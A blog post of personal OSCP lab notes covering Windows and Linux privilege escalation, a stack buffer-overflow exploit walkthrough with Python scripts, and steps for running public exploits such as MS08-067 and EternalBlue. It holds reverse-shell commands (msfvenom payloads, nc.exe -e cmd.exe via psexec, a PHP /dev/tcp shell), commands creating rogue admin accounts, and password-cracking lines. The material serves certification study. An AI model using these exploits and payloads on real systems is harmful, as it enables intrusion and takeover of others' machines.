---
layout: post
title:  "OSCP Notes"
categories: OSCP
---

Collection of notes I took while doing the OSCP labs.

# Windows

## Post Exploitation and Privilege Escalation

* Helpful collection of priv esc methods: <https://guif.re/windowseop>

* File transfer methods: <https://isroot.nl/2018/07/09/post-exploitation-file-transfers-on-windows-the-manual-way/>

* Tools
    * [Powerless](https://github.com/M4ximuss/Powerless) (Privilege Escalation script working without Powershell; needs [accesschk.exe](https://web.archive.org/web/20111111130246/http://live.sysinternals.com/accesschk.exe))
    * [Windows Priv Esc Checker](https://github.com/pentestmonkey/windows-privesc-check)
    * [Windows Exploit Suggester NG](https://github.com/bitsadmin/wesng) (feed it `systeminfo` output and it finds matching exploits)
    * [BeRoot](https://github.com/AlessandroZ/BeRoot/tree/master/Windows)
    * [Pre-Compiled Windows Exploits](https://github.com/SecWiki/windows-kernel-exploits)
    * [Download and compile exploits automatically](https://github.com/wwong99/pentest-notes/blob/master/scripts/xploit_installer.py)
    * [Exploit Table](https://malrawr.com/04.windows/exploit-table/)

* From Admin to System on Windows <= XP:
    * check time with `time`
    * run `at 01:23 /interactive cmd.exe` one minute after what `time` said -> cmd.exe will popup (obviously you will need a GUI for this to work)

* Forward only internally accessible port and then exploit a service running on it (e.g. MS08-067)
    * Start SSH on Kali: `service ssh start`
    * Forward port 445 to our Kali box on port 445: `plink.exe -l root -pw <kalipassword> -P 22 -R 445:127.0.0.1:445 <kaliipaddress>`
    * Port 445 should be open on Kali now: `netstat -tulpn | grep 445`
    * Now you can start scanning and exploiting the service: `nmap -sVC -p 445 127.0.0.1`

## Buffer Overflow

* Nice tutorial: <https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2016/june/writing-exploits-for-win32-systems-from-scratch/>

* Important:
    * run all apps as administrator (also Immunity Debugger)
    * use Python2 for exploit development (easier to work with buffers)

* Steps
    * Fuzzing:
        ```python
        #!/usr/bin/python

        import socket

        buffer = ['A']
        counter = 100

        while len(buffer) <= 30:

            buffer.append('A'*counter)
            counter = counter + 200

        for string in buffer:

            print 'Fuzzing PASS with %s bytes' % len(string)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            connect = s.connect(('10.11.x.x',110))
            s.recv(1024)
            s.send('USER test\r\n')
            s.recv(1024)
            s.send('PASS ' + string + '\r\n')
            s.send('QUIT\r\n')
            s.close()
        ```
    * Locate saved EIP:
        * `pattern_create.rb -l 2700`
        * `pattern_offset.rb -l 2700 -q 39694438` (value in EIP at crash)
    * Check for bad characters:
        ```python
        #!/usr/bin/python 
        import socket 
 
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
 
        badchars = (
        “\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10”
        “\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20”
        “\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30”
        “\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40”
        “\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50”
        “\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60”
        “\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70”
        “\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80”
        “\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90”
        “\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0”
        “\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0”
        “\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0”
        “\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0”
        “\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0”
        “\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0”
        “\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff”
        )

        buffer = 'A'*2606 + 'B'*4 + badchars

        s.connect(('10.11.x.x',110))
        s.recv(1024)
        s.send('USER test\r\n')
        s.recv(1024)
        s.send('PASS ' + buffer + '\r\n')
        s.send('QUIT\r\n')
        s.close()
        ```
    * Find return address (ESP points exactly at shellcode):
        * we need to point EIP to an instruction such as `JMP ESP` to get code execution
        * find an appropriate module with mona.py in Immunity Debugger:
            * attach to process
            * run `!mona modules`
            * find a module with disabled protections
        * find opcode of `jmp esp` instruction: `nasm_shell.rb`, then `jmp esp` => FFE4 is the opcode
        * find this opcode inside the module: `!mona find -s "\xff\xe4" -m slmfc.dll`
        * choose one address without bad characters and write it in little endian (wrong way around)
    * Generate shellcode: `msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.x LPORT=443 EXITFUNC=thread -f python -e x86/shikata_ga_nai -b "\x00\x0a\x0d"`
    * Finish exploit (put some space in front of shellcode!)
        ```python
        #!/usr/bin/python 
        import socket 
 
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
 
        shellcode = '<put shellcode here>'

        buffer = 'A'*2606 + '\x8f\x35\x4a\x5f' + '\x90' *8 + shellcode

        s.connect(('10.11.x.x',110))
        s.recv(1024)
        s.send('USER test\r\n')
        s.recv(1024)
        s.send('PASS ' + buffer + '\r\n')
        s.send('QUIT\r\n')
        s.close()
        ```

## Exploits

* MS08-067:
    * grab exploit from <https://github.com/andyacer/ms08_067>
    * generate shellcode with `msfvenom -p windows/shell_reverse_tcp LHOST=1.3.3.7 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f python -a x86 --platform windows` and replace the one in the script with it
    * run it `python ms08_067_2018.py 10.11.1.x 1 445`

* MS09-012 (Churrasco):
    * grab precompiled version from <https://github.com/Re4son/Churrasco>
    * `churrasco.exe -d "net user /add hacker hacker"`
    * `churrasco.exe -d "net localgroup administrators hacker /add"`
    * `churrasco.exe -d "net localgroup 'Remote Desktop Users' hacker /add"`

* MS09-050:
    * grab exploit from <https://www.exploit-db.com/exploits/40280>
    * replace shellcode with own e.g. `msfvenom -p windows/shell/reverse_tcp LHOST=10.11.0.x LPORT=443 EXITFUNC=thread -f python`

* MS11-046 (afd.sys):
    * grab exploit from <https://www.exploit-db.com/raw/40564>
    * compile with `i686-w64-mingw32-gcc 40564.c -o expl.exe -lws2_32`

* MS17-010 (EternalBlue):
    * grab exploit from <https://www.exploit-db.com/exploits/42315>
    * download missing mysmb module from <https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/42315.py> or <https://github.com/worawit/MS17-010/blob/master/mysmb.py>
    * modify the script in line 922 to send and execute a file:
        * `smb_send_file(smbConn, '/root/exploit/exploit.exe', 'C', '/exploit.exe')`
        * `service_exec(conn, r'cmd /c c:\\exploit.exe')`
    * generate file with msfvenom and place it at correct path and then run the exploit
    * if it fails with "not found accessible named pipe", then just change the USERNAME variable in line 36 to `//` in order to login as anonymous user


## WebDAV

* Tools
    * MSF's windows/iis/iis_webdav_upload_asp module
    * cadaver
    * davtest
    * Python implementation of above metasploit module: <https://gist.github.com/mgeeky/ce179cdbe4d8d85979a28c1de61618c2>

## SMB

* connect with `smbclient \\\\10.11.1.x\\foo`
* if you have creds you can run commands with psexec: `PsExec.exe -u user -p pwd \\host C:\tmp\nc.exe 10.11.0.x 31337 -e cmd.exe`
* or `python /usr/share/doc/python-impacket/examples/psexec.py hacker:hacker@10.11.1.x`

## MSSQL

* remotely connect to the database with `sqsh -S 10.11.1.x:1433 -U sa -P pwd`
* maybe we're allowed to run commands: `xp_cmdshell 'whoami'`
* add a new admin user: `xp_cmdshell 'net user /add hacker hacker'` and `xp_cmdshell 'net localgroup administrators hacker /add'`

# Linux

## Post Exploitation and Privilege Escalation

* Tools
    * [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)

## MySQL
* Command line usage: `mysql -u root -p`
    * display available databases and tables `show databases;` or `show tables;`
    * use database `use <database>;`
* [MySQL UDF Privilege Escalation](https://infamoussyn.wordpress.com/tag/privilege-escalation/)

## Exploits

* CVE-2009-2692, Linux Kernel 2.4.x/2.6.x sock_sendpage():
    * grab from <https://www.exploit-db.com/raw/9545>
    * compile with `gcc -m32 -Wl,--hash-style=both 9545.c -o 9545`
* CVE-2002-0082, OpenFuck, Apache mod_ssl < 2.8.7:
    * grab from <https://github.com/heltonWernik/OpenLuck>
    * compile with `gcc -o openfuck OpenFuck.c -lcrypto` (don't forget to `apt install libssl-dev`)
    * search the right offset: `./openfuck | grep -i redhat | grep "1.3.23"`
    * run: `./openfuck 0x73 10.11.1.x 443 -c 50`
* CVE-2003-0127, Linux Kernel 2.2.x/2.4.x (Redhat) ptrace/kmod:
    * grab from <https://www.exploit-db.com/raw/3>
    * if compilation fails with an error telling that `ld` is missing, just tell the compiler in which directory to search for: `gcc -B /usr/bin expl.c - expl`
* CVE-2010-1146, Linux Kernel 2.6.34-rc3 / RedHat / Ubuntu 9.10, ReiserFS:
    * grab from <https://www.exploit-db.com/exploits/12130>
    * modify the exploit in order to match the system you're exploiting (e.g. replace `/tmp` with `/var/log/apache_logs/data`; replace `gcc` with `gcc-4.4`; add correct path before each `.reiserfs_priv`: e.g. `/var/log/apache_logs/.reiserfs_priv/xattrs`)
    * mount (e.g. `/var/log/apache_logs`)


# Other

## General

* [AutoRecon](https://github.com/Tib3rius/AutoRecon): Super useful enumeration tool which takes away a lot of manual enumeration work. Just invoke it with e.g. `python3 autorecon.py <ip1> <ip2> -o <outputdir>` and let it run in the background.

* [OSCP Survival Guide](https://github.com/xxooxxooxx/xxooxxooxx.github.io/wiki/OSCP-Survival-Guide)

## Cracking

* Crack a password protected ZIP file: `fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' protected.zip`
* Crack a login with patator: `patator http_fuzz url=http://10.11.1.x/foo/index.pl method=POST body='Action=Login&RequestedURL=&Lang=en&TimeOffset=0&User=root%40localhost&Password=FILE0' -x ignore:fgrep='Login failed! Your user name or password was entered incorrectly.' 0=./cewl.txt"`

## File Inclusion

* Collection of FI tips: <https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion>
* if you're allowed to use the `php://input` filter, you may be able to get a reverse shell with `<?php echo shell_exec('0<&196;exec 196<>/dev/tcp/10.11.0.x/31337; sh <&196 >&196 2>&196'); ?>` (remember to send this in the body of a POST request): `curl -X POST --data "<?php echo shell_exec('<whatever>'); ?>" "https://10.11.1.x/foo.php?page=php://input%00" -k –v`

## SMB

* SMB tips: <https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html>

* Execute directly via SMB (helpful if you can't write anything to disk):
    * setup an SMB server on your Kali box: `python /usr/share/doc/python-impacket/examples/smbserver.py SHARE .`
    * run `\\10.11.0.x\SHARE\Powerless.bat` on victim

* Important:
    * Never completely trust `enum4linux` since it misses a lot of stuff (version for example). Use this little bash script to grab the SMB version:

    ```bash
    #!/bin/sh 
    #Author: rewardone 
    #Description: 
    # Requires root or enough permissions to use tcpdump 
    # Will listen for the first 7 packets of a null login 
    # and grab the SMB Version 
    #Notes: 
    # Will sometimes not capture or will print multiple 
    # lines. May need to run a second time for success. 

    if [ -z $1 ]; then echo "Usage: ./smbver.sh RHOST {RPORT}" && exit; else rhost=$1; fi 

    if [ ! -z $2 ]; then rport=$2; else rport=139; fi 

    tcpdump -s0 -n -i tap0 src $rhost and port $rport -A -c 7 2>/dev/null | grep -i "samba\|s.a.m" | tr -d '.' | grep -oP 'UnixSamba.*[0-9a-z]' | tr -d '\n' & echo -n "$rhost: " & 

    echo "exit" | smbclient -L $rhost 1>/dev/null 2>/dev/null 

    echo "" && sleep .1 
    ```

    * Alternatives to enum4linux: smbmap, nullinux, NSE scripts (invoke with `nmap -sV -p 139,445 --script='smb-vuln*' --script-args="unsafe=1" <IP address>`)

## Pivoting

* Collection of pivoting methods: <https://sushant747.gitbooks.io/total-oscp-guide/port_forwarding_and_tunneling.html>

* sshuttle usage: `sshuttle -r user@10.11.1.x 10.1.1.0/24`
* alternative: dynamic port forwarding with ssh `ssh -D 9050 user@10.11.1.x`, then use proxychains `proxychains nmap -v --top-ports=20 -sT -Pn 10.1.1.x`
